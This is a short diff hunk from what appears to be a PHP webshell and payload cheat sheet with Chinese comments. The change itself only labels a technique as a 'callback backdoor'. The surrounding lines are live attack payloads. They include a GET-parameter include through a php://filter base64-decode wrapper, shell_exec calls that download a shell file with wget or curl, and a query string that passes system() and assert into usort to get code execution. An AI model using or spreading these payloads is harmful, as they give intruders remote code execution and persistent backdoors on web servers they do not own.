@@ -60,7 +60,8 @@ include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
 <?php shell_exec('wget -O 1.php url');    // download shell
 <?php shell_exec('curl -o 1.php url');    // 預設下載index.html
 
-// 思路：延伸數組＋回調函數 php 5.4以後的特性  
+// 思路：延伸數組＋回調函數 php 5.4以後的特性
+// 回調後門  
 // 參考下方reference
 ?1[]=blah&1[]=system();&2=assert
 param=usort(...$_GET);
